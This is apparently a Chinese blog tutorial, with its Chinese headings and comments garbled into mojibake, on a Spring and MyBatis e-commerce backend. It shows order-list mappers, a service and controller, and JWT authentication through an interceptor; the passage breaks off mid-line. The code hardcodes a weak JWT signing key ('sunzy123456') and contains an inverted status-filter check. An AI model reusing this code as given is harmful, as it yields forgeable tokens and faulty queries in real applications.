class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverName&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverMobile&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_address&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverAddress&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;actual_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;actualAmount&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payType&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_remark&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderRemark&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryType&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_flow_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryFlowId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_freight&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderFreight&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delete_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deleteStatus&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;flish_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;flishTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cancel_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cancelTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;close_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;closeType&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItems&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;</span>/&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectOrders&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span>&gt;</span>    select    order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address,    total_amount, actual_amount,pay_type,order_remark,status,delivery_type,    delivery_flow_id,order_freight,delete_status,create_time,    update_time,pay_time,delivery_time, flish_time,cancel_time,close_type    from orders    where user_id=#&#123;userId&#125;    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>      and status=#&#123;status&#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>    limit #&#123;start&#125;,#&#123;limit&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre><p>OrderItemMapper</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;OrderItem&gt; <span class="hljs-title">listOrderItemsByOrderId</span><span class="hljs-params">(String orderId)</span></span>;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrderItem&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_counts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyCounts&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;basket_date&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;basketDate&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyTime&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_comment&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isComment&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listOrderItemsByOrderId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    select      item_id,      order_id,      product_id,      product_name,      product_img,      sku_id,      sku_name,      product_price,      buy_counts,      total_amount,      basket_date,      buy_time,      is_comment    from order_item where order_id=#&#123;orderId&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listOrders</span><span class="hljs-params">(String userId, String status, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;    Example example = <span class="hljs-keyword">new</span> Example(Orders.class);    Example.Criteria criteria = example.createCriteria();    criteria.andLike(<span class="hljs-string">&quot;userId&quot;</span>, userId);    <span class="hljs-keyword">if</span>(status != <span class="hljs-keyword">null</span> &amp;&amp; <span class="hljs-string">&quot;&quot;</span>.equals(status))&#123;        criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,status);    &#125;    <span class="hljs-keyword">int</span> count = ordersMapper.selectCountByExample(example);    <span class="hljs-comment">//2.è®¡ç®—æ€»é¡µæ•°ï¼ˆå¿…é¡»ç¡®å®šæ¯é¡µæ˜¾ç¤ºå¤šå°‘æ¡  pageSize = limitï¼‰</span>    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;    List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit);    PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, ordersVOS);    <span class="hljs-keyword">return</span> ResultVO.success(ordersVOPageHelper);&#125;</code></pre></li></ul><ul><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getList</span><span class="hljs-params">(String userId,</span></span><span class="hljs-function"><span class="hljs-params">                        String status,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">int</span> pageNum,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">int</span> limit)</span></span>&#123;    <span class="hljs-keyword">return</span> orderService.listOrders(userId, status, pageNum,limit);&#125;</code></pre></li></ul><h4 id="æ”¶è´§åœ°å€ç®¡ç†"><a href="#æ”¶è´§åœ°å€ç®¡ç†" class="headerlink" title="æ”¶è´§åœ°å€ç®¡ç†"></a>æ”¶è´§åœ°å€ç®¡ç†</h4><h2 id="2-JWTå®ç°æƒé™è®¤è¯"><a href="#2-JWTå®ç°æƒé™è®¤è¯" class="headerlink" title="2  JWTå®ç°æƒé™è®¤è¯"></a>2  JWTå®ç°æƒé™è®¤è¯</h2><h3 id="2-1-JWTå®ç°"><a href="#2-1-JWTå®ç°" class="headerlink" title="2.1 JWTå®ç°"></a>2.1 JWTå®ç°</h3><h4 id="å¯¼å…¥JWTä¾èµ–"><a href="#å¯¼å…¥JWTä¾èµ–" class="headerlink" title="å¯¼å…¥JWTä¾èµ–"></a>å¯¼å…¥JWTä¾èµ–</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h4 id="ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯"><a href="#ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯" class="headerlink" title="ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯"></a>ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯</h4><pre><code class="hljs java"><span class="hljs-comment">// éªŒè¯æˆåŠŸåˆ™ç”Ÿæˆå¯¹åº”çš„token</span><span class="hljs-comment">// ä½¿ç”¨jwtç”Ÿæˆtoken</span>JwtBuilder builder = Jwts.builder();Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);JwtBuilder jwtBuilder = builder.setSubject(username)    <span class="hljs-comment">//è®¾ç½®subject</span>    .setIssuedAt(<span class="hljs-keyword">new</span> Date())        <span class="hljs-comment">// è®¾ç½®tokenç”Ÿæˆçš„æ—¶é—´</span>    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// è®¾ç½®useridä¸ºtokençš„å”¯ä¸€id</span>    .setClaims(map)                 <span class="hljs-comment">// mapä¸­å¯ä»¥å­˜æ”¾ç”¨æˆ·çš„è§’è‰²å’Œæƒé™ä¿¡æ¯</span>    .setExpiration(<span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// è®¾ç½®tokençš„è¿‡æœŸæ—¶é—´ ä¸ºä¸¤å¤©</span>    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// è®¾ç½®tokençš„åŠ å¯†æ–¹å¼å’ŒåŠ å¯†å¯†é’¥</span>String token = jwtBuilder.compact();   <span class="hljs-comment">// è·å–token</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, token, user);</code></pre><h4 id="å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token"><a href="#å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token" class="headerlink" title="å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token"></a>å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p><h4 id="JWTè¿›è¡Œtokenè§£æ"><a href="#JWTè¿›è¡Œtokenè§£æ" class="headerlink" title="JWTè¿›è¡Œtokenè§£æ"></a>JWTè¿›è¡Œtokenè§£æ</h4><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);&#125;<span class="hljs-keyword">else</span> &#123;    JwtParser parser = Jwts.parser();    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´</span>    <span class="hljs-keyword">try</span>&#123;        <span class="hljs-comment">// å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸</span>        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);        Claims body = claimsJws.getBody();  <span class="hljs-comment">// è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ®</span>        String subject = body.getSubject();  <span class="hljs-comment">// è·å–tokenä¸­å‘subject</span>        String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼</span>    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;tokenä¸åˆæ³•è¯·é‡æ–°ç™»å½•ï¼&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-keyword">catch</span> (Exception e)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;æœªçŸ¥é”™è¯¯&quot;</span>, <span class="hljs-keyword">null</span>);    &#125;</code></pre><h4 id="ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token"><a href="#ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token" class="headerlink" title="ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token"></a>ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token</h4><ul><li><p>åˆ›å»ºæ‹¦æˆªå™¨</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> io.jsonwebtoken.*;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        String token = request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);        <span class="hljs-keyword">if</span> (token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;            doResponse(response, <span class="hljs-string">&quot;è¯·å…ˆç™»å½•ï¼&quot;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            JwtParser parser = Jwts.parser();            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´</span>            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-comment">// å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸</span>                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);                Claims body = claimsJws.getBody();  <span class="hljs-comment">// è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ®</span>                String subject = body.getSubject();  <span class="hljs-comment">// è·å–tokenä¸­å‘subject</span>                String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼</span>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;                doResponse(response,<span class="hljs-string">&quot;tokenä¸åˆæ³•ï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;                doResponse(response,<span class="hljs-string">&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                doResponse(response,<span class="hljs-string">&quot;æœªçŸ¥é”™è¯¯ï¼&quot;</span>);            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;        ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);        String string = JSON.toJSONString(resultVO);        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        PrintWriter writer = response.getWriter();        writer.write(string);        writer.flush();        writer.close();    &#125;&#125;</code></pre></li></ul><ul><li><p>é…ç½®æ‹¦æˆªå™¨</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‹¦æˆªå™¨çš„é…ç½®ç±»</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;        <span class="hljs-comment">// registryæ˜¯æ‹¦æˆªå™¨çš„æ³¨å†Œå™¨</span>        <span class="hljs-comment">// å°†è‡ªå·±åˆ›å»ºçš„æ‹¦æˆªå™¨åŠ å…¥è¿›æ¥ å³å¯å®ç°æ‹¦æˆªåŠŸèƒ½</span>        registry.addInterceptor(checkTokenInterceptor)        .addPathPatterns(<span 